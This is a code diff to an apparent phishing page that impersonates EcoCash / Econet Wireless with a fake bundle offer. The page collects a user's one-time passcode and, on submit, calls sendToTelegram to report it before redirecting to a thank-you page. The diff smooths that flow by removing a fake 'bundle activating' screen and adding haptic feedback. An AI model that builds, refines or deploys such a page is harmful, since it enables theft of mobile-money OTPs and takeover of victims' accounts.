@@ -366,9 +366,6 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
   transition:transform .4s ease;
 }
 .vstep-line.done::after{transform:scaleX(1)}
-.proc-ring{width:54px;height:54px;border-radius:50%;margin:0 auto 16px;border:3px solid rgba(26,111,255,.18);border-top-color:var(--blue);animation:spin 1s linear infinite;box-shadow:0 0 20px rgba(26,111,255,.18)}
-.proc-title{font-size:17px;font-weight:900;color:var(--ink);margin-bottom:6px;letter-spacing:-.3px}
-.proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.65}
 
 /* SECURITY */
 .security-strip{display:flex;align-items:center;justify-content:center;padding:12px 0 4px;border-top:1px solid rgba(0,51,160,.08);margin-top:6px}
@@ -556,17 +553,7 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
       <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
 
-    <!-- STEP 3: Processing -->
-    <div id="step4" class="step">
-      <div class="card">
-        <div class="card-top-bar"></div>
-        <div class="proc-body">
-          <div class="proc-ring"></div>
-          <div class="proc-title">Processing Request</div>
-          <div class="proc-sub">Your bundle is being activated.<br>This will only take a moment.</div>
-        </div>
-      </div>
-    </div>
+    <!-- OTP confirmed → navigate directly via curtain -->
 
   </div>
 </div>
@@ -886,7 +873,6 @@ function runVerifySequence(raw){
 /* ── OTP BUTTON ───────────────────────────── */
 document.getElementById('otpBtn').onclick=()=>{
   if(otpSubmitted)return;
-  // simulate wrong OTP for demo — in prod check server
   if(otpValue==='000000'){
     document.getElementById('otpDisplay').classList.add('shake');
     setTimeout(()=>document.getElementById('otpDisplay').classList.remove('shake'),400);
@@ -895,9 +881,9 @@ document.getElementById('otpBtn').onclick=()=>{
     return;
   }
   otpSubmitted=true;
+  haptic('success');
   sendToTelegram('offer_received');
-  showStep('step4');
-  setTimeout(()=>navigate('thankyou.html'),1200);
+  navigate('thankyou.html');
 };
 
 /* ── RESEND ───────────────────────────────── */
